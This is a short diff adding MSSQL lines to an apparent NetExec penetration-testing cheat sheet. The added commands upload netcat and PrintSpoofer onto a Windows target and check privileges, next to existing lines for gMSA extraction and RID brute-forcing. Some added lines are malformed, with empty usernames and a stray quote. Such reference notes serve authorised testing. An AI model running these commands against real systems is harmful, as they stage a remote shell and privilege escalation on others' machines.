@@ -908,6 +908,16 @@ nxc ldap &lt;IP&gt; -u user -p pass --gmsa
 
 nxc winrm &lt;IP&gt; -u user -p pass --dir
 nxc wmi &lt;IP&gt; -u user -p pass --wmi-query --wmi-namespace
+
+# MSSQL access
+nxc mssql &lt;IP&gt; -u  -p ''
+nxc mssql &lt;IP&gt; -u  -p ' --put-file nc.exe C:\\\\Windows\\\\Tasks\\\\nc.exe
+nxc mssql &lt;IP&gt; -u  -p '' --put-file printspoofer32.exe C:\\\\Windows\\\\Tasks\\\\printspoofer32.exe
+
+# Check privileges
+nxc mssql &lt;IP&gt; -u  -p '' --local-auth -x "whoami /priv"
+
+
 nxc mssql &lt;IP&gt; -u sa -p pass --local-auth --rid-brute
 nxc ftp &lt;IP&gt;
 nxc vnc &lt;IP&gt;
